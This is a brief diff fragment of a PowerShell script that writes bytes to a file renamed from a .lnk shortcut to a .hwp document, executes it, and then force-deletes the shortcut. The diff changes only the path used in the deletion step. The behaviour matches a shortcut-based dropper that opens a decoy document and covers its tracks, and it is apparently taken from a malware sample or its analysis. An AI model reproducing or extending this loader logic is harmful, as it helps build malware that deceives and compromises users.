@@ -11,7 +11,8 @@ ac -path "C:\Users\user\Downloads\1.txt" $lk
 $fsdf=$lk.Replace('.lnk','.hwp');[System.IO.File]::WriteAllBytes($fsdf,$file1);
 &".\$fsdf";
 
-ri $lk -force;
+ri ".\$lk" -force;
+
 
 
 
